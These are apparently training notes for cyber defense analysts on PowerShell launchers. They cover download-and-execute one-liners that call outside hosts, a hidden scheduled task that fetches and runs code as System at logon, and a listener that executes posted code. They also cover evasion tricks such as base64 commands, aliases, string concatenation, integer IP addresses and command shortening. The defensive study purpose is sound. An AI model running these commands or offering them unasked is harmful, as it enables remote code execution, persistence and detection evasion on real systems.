Invoke-WebRequest or Invoke-RestMethod are the most common ways for PowerShell to pull data over the network. Invoke-RestMethod is better at dealing with JavaScript Object Notation (JSON) and eXtensible Markup Language (XML) data types, while Invoke-WebRequest is better at returning strings.
$response=Invoke-WebRequest -uri "http://1.2.3.4/index.html"
$data=$response.Content



Another way to obtain data from the network is to call the .NET object directly with the following command:
$data=(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")



Inbound Connections


PowerShell is built on the .NET framework, so anything C# can do, PowerShell can do. This means there are many ways to have a system listen for inbound connections in PowerShell. The most common way to listen is to make a webserver.
# Http Server
$http = New-Object System.Net.HttpListener

# Hostname and port to listen on
$http.Prefixes.Add("http://127.0.0.1:8080/")

# Start the Http Server 
$http.Start()

#This will block until there is a connection
$context = $http.GetContext()

$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
[string]$html = "<h1>A PowerShell Webserver</h1>" 
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)

#Shutdown gracefully
$context.Response.OutputStream.Close()
$http.Stop()



Executing Data 


The second step for a launcher to perform is to execute the code. Launchers use the command Invoke-Expression to execute text. This allows PowerShell to get a block of text, and execute it as commands.
$Command = "get-process"

Invoke-Expression $Command
#or
$Command | Invoke-Expression



Examples


When the -Command option is used with PowerShell.exe there is a limitation. The command cannot use variables the same way they are used in a terminal prompt. Commands can be modified to not use variables as an intermediary.
PowerShell.exe -ExecutionPolicy bypass -Command "Invoke-Expression  (Invoke-WebRequest -uri http://199.63.64.31/index.html).content"



The above example uses PowerShell to retrieve code from a remote location via Hypertext Transmission Protocol (HTTP) and execute the code content. Instead of executing it from the command line, the Scheduled Task (Schtask) command is used to create a scheduled job that automatically executes the PowerShell command at a given interval. The following example creates a scheduled job that downloads code and executes it with PowerShell.
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://1.2.3.4/'''))'" /sc onlogon /ru System



Obfuscation Techniques
Post-exploitation PowerShell scripts use a variety of obfuscation techniques to hide their functionality from users and bypass the Windows Anti-Malware Scan Interface (AMSI) or other antivirus technologies. Defenders need to recognize common obfuscation techniques like encoding in order to apply proper decoding techniques. The ability to adequately identify and utilize obfuscation techniques can help Cyber Defense Analysts (CDA) to replicate or understand attacker activities.

﻿

Base64
﻿

Base64 encoding is commonly used to represent binary data in text form and is a common obfuscation technique that defense analysts must be familiar with. The numbering system is base 10, meaning that each digit represents 10 different things with 10 characters (0..9) to use. In base64, a number is encoded with uppercase and lowercase letters, the 0–9 digits as well as the + and / signs. The = sign is used to pad the number since a base64-encoded string needs to be a multiple of 3. Meaning that if there was a four-character-long base64 string, it requires two = signs afterward to make it an even multiple of 3.

﻿

With PowerShell scripts, there are two options for executing a base64-encoded command. The script receives a base64-encoded string to execute and decodes the string before sending it to Invoke-Expression, or the PowerShell process is kicked off and told to execute a base64-encoded command. PowerShell has this feature because sometimes it is difficult to escape special characters, so PowerShell accepts and executes a base64 command directly.

﻿

##############Manipulating Base64 Strings###############
﻿

The following PowerShell code demonstrates the process for taking a string and converting it to the base64 equivalent, followed by the function to decode the base64 back into a plaintext string.

#Convert to a base64 string
$Text = 'get-process'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

#$Encoded Text is: ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA==

#Decode
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
﻿

Executing a Base64 String Directly
﻿

Instead of converting base64 code to a string for execution, the base64 value can be passed directly to PowerShell for execution. The following example demonstrates that method.

powershell.exe -encodedCommand "ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA=="
﻿



Case Sensitivity
﻿

Windows is famously case-insensitive. It is possible to change directories to c:\windows or c:\wINdoWs and get the same result. This type of obfuscation is commonly seen in attacks, though it is not as effective as other methods.

﻿

An attacker can change their PowerShell script to take advantage of this case insensitivity. These two commands execute the exact same way:

Invoke-WebRequest -uri 'http://1.2.3.4/'
or

inVoKE-weBReQuESt -uRi 'http://1.2.3.4/'
﻿

Random Spaces
﻿

PowerShell does not recognize spaces between the commands, but they may matter to the defenders. Attackers include multiple spaces that are ignored by PowerShell but are aimed at adding obfuscation to the command execution so cyber defense tools are less likely to detect their execution.﻿

inVoKE-weBReQuESt     -uRi  'http://1.2.3.4/'
﻿

String Concatenation
﻿

PowerShell adds strings together, giving an attacker another option to obfuscate the command and avoid detection. If a defender suspects an HTTP Uniform Resource Locator (URL) is used by the attacker, they might conduct log searches using the value http://, but that search does not match the concatenation of characters in the following command:

Invoke-WebRequest -uri 'htt' + 'p' + ':/' + '/1.2.3.4/'
﻿

Internet Protocol Addresses as a Base10 Number
﻿

Internet Protocol version 4 (IPv4) addresses are commonly shown as a set of four octet numbers between 0.0.0.0 and 255.255.255.255. In reality, this is just a human-readable way of representing an integer number between 0 and 4.2 billion. Instead of using the common IPv4 address format, attackers replace the address with the integer equivalent value, making it less noticeable to a defender looking for IPv4 addresses. Attackers use either the decimal representation of the integer, or the hexadecimal format. Each octet of the address is an 8-bit number, and the four together form the 32-bit address. PowerShell can handle multiple formats, giving an attacker the option to connect using a normal IPv4 address, a base10 integer Internet Protocol (IP) address, or a base16 (hex) IP address.  The following example shows PowerShell's ability to convert the address formats, first from standard address to a base10 value, then to base16 value, then back to the standard address.

([ipaddress]"1.2.3.4").Address
67305985

(67305985).tostring('x8')
04030201

([ipaddress]0x04030201).ipaddresstostring
1.2.3.4
﻿

Converting an IP address to a number and back works without issue. However, PowerShell uses host ordering (little-endian) to store the integer value, which is verified above by converting the decimal number to hex. Using that integer as a replacement for the IP address does not work unless it is converted to network ordering (big-endian). This is manually done by reversing the order of the four bytes that make up the hex value and displaying the corresponding base10 value from that. In the example below, converting 1.2.3.4 makes the decimal version corresponding to 4.3.2.1. Simply entering the IP backward and generating the integer for that reversed IP address fixes the problem and provides the correct integer value that can be used to replace the address.

([ipaddress]"1.2.3.4").Address
67305985

ping 67305985
Pinging 4.3.2.1 with 32 bytes of data:

([ipaddress]"4.3.2.1").Address
16909060

ping 16909060
Pinging 1.2.3.4 with 32 bytes of data:
﻿+





 PowerShell Aliases
PowerShell has the ability to create aliases for other commands. Some standard commands are actually aliases. For example, the command cd is an alias for the real command being executed, Set-Location. There is even an alias for setting aliases, sal. The alias for Invoke-WebRequest is iwr. For a full list of current aliases, use the command get-aliases.

﻿

Existing aliases are used to shorten up a malicious PowerShell command or to make the commands being executed appear benign.

sal block-website iwr
block-website -uri http://1.2.3.4



Shortening the Request
A launcher script is a minimal amount of code that runs from a smaller space and retrieves a larger amount of code from a remote location. However, at times, even the launcher script might have a reduced amount of space to reside in, such as 255 characters for a Scheduled Task. There are several techniques used to make PowerShell commands shorter, enabling the code to fit into a constrained space. Seeing these techniques used in a script may indicate that the script is malicious.

﻿

Shortening the Callback Request
﻿

The example below is a simple launcher script that downloads code from a remote site via HTTP, stores that code in a variable $data, and executes the code.

$data = (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
Invoke-Expression $data
﻿

Currently, this is 108 characters. The pipe command can be used so that the $data variable is not needed.

Invoke-Expression (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Removing the $data variable shortens the script to 93 characters. The System in System.Net.WebClient is not required and Invoke-Expression has a default alias of iex.

iex (New-Object Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Removing those items brings the request down to 72 characters. The http:// is assumed so it is not required; this brings the total down to 65 characters.

iex (New-Object Net.WebClient).DownloadFile("1.2.3.4/index.html")
﻿

Changing the command to the alias for Invoke-WebRequest brings this launcher down even further to only 36 characters.

iex (iwr 1.2.3.4/index.html).Content
﻿

Depending on the resource name, this line could be even shorter. It does not take many characters for an attacker to gain full control of a system with PowerShell. 

Remain aware of aliases when writing detection signatures, as targeting only full cmdlet names without accounting for abbreviated versions like iwr may result in missed alerts.﻿

﻿

Shortening a Webserver
﻿

This is the original webserver. It executes whatever is sent over a POST command and is 520 characters. The max size for a schtasks command is 255 characters.

$http = New-Object System.Net.HttpListener
$http.Prefixes.Add("http://0.0.0.0:8080/")
$http.Start()
$context = $http.GetContext()
$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
[string]$html = "<h1>A PowerShell Webserver</h1>" 
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
$context.Response.OutputStream.Close() 
$http.Stop()
Invoke-Expression $data
﻿

Using shortening techniques, the size of the webserver code below is reduced down to 367 characters. The techniques included making the variable names single characters, removing all the System prefixes, removing extra spaces between the = signs, removing html, and using a condensed syntax to create the HttpListener object.

$a=[Net.HttpListener]::new() 
$a.Prefixes.Add("http://0.0.0.0:8080/")
$a.Start()
$c=$a.GetContext()
$d=[IO.StreamReader]::new($c.Request.InputStream).ReadToEnd()
[string]$h="" 
$b=[Text.Encoding]::UTF8.GetBytes($h) 
$c.Response.ContentLength64=$b.Length
$c.Response.OutputStream.Write($b, 0, $b.Length)
$c.Response.OutputStream.Close() 
$http.Stop()
iex $d
﻿

Additional space reduction techniques can be implemented. In the case of this webserver, which is only being used to receive additional code for execution, sending data back to the client is not required, so those parts can be removed. With those omissions implemented in the code below, this brings the total size down to 214 characters.

$a=[Net.HttpListener]::new() 
$a.Prefixes.Add("http://0.0.0.0:8080/")
$a.Start()
$c=$a.GetContext()
iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd()
$c.Response.OutputStream.Close() 
$a.Stop()
﻿

Taking advantage of |% being an alias for passing an object to a ForEach loop, and using $_ reference to that object, all the variables can be removed. This allows the entire webserver to come down to 157 characters. However, the webserver does not close gracefully, so repeated runs in the same powershell.exe process do not work. The client sending the data to the server hangs.

[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  iex ([IO.StreamReader]::new($_.GetContext().Request.InputStream)).ReadToEnd()
}
﻿

To ensure the listening launcher shuts down properly, a Response.OutStream command is included and the code is slightly modified, bringing the total size to 206 characters. That is still small enough to fit in the Schedule Task space limitations while resulting in a webserver that closes gracefully and does not cause the client connection to hang.

[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  $c=$_.GetContext();
  iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
  $c.Response.OutputStream.Close();
  $_.stop()
}
﻿

Shortening the PowerShell.exe Call
﻿

If a launcher is being called outside PowerShell.exe, then the launcher command needs to be passed to the executable with several options. PowerShell options do not require the entire option spelled out, only enough of the characters to uniquely identify the option.

﻿

Table 12.3-2 lists all the options that PowerShell.exe accepts with minimal unique characters. Since four options start with No, to specify the NoProfile option, -nop needs to be specified at a minimum. Likewise, since only one option starts with the letter V to specify Version, then only -v needs to be given. 


 ![image](https://github.com/user-attachments/assets/18603168-0ae6-4d49-994b-d84ef04b1d3a)



This works for all options provided to PowerShell commands. Invoke-WebRequest has the following options starting with the letter M, -Method and -MaximumRedirection, and only one option starting with the letter B. That means these two commands do the same thing.
iwr http://127.0.0.1:8080/ -Method POST -Body 'get-process'

and

iwr http://127.0.0.1:8080/ -Me POST -B 'get-process'



![image](https://github.com/user-attachments/assets/be29702d-2abd-4240-b7cf-a10f709fcf34)


![image](https://github.com/user-attachments/assets/ac937417-746a-4934-aa48-691a5a8aaf9e)



![image](https://github.com/user-attachments/assets/9fbb62b4-0c1b-4f90-b0a3-b3e0222b57ec)




![image](https://github.com/user-attachments/assets/9fbb62b4-0c1b-4f90-b0a3-b3e0222b57ec)

![image](https://github.com/user-attachments/assets/ac937417-746a-4934-aa48-691a5a8aaf9e)






